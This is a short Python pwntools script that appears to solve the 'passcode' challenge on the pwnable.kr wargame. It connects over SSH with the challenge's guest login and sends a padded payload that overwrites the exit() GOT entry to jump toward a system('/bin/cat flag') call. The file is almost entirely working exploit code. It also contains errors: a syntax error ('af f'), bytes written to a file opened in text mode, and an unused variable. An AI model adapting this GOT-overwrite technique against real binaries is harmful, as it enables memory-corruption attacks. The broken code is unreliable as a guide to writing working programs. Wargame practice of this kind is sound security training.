#!/usr/bin/env python3

from pwn import *
import struct

s = ssh(host="pwnable.kr", port=2222, user="passcode", password="guest")
io = s.process('./passcode')

io.recvuntil(b'enter you name : ')


# address of exit() GOT
address = struct.pack("<I", 0x0804c028)

address_string = f"{address}"

# overwrite exit() GOT to push eax and then call system for bypassing the if statment

payload1 = flat([
    # padding
    b"A" * 96,
    # exit() GOT
    p32(0x0804c028),
    p32(134517475)      
])     
with open("input.txt", "w") af f:
    f.write(payload1)
# print(payload)
io.sendline(payload1)

# io.recvuntil(b'enter passcode1 : ')

# # push eax = "/bin/cat flag
# payload2 = b"134517475"

# io.sendline(payload2)



io.interactive()
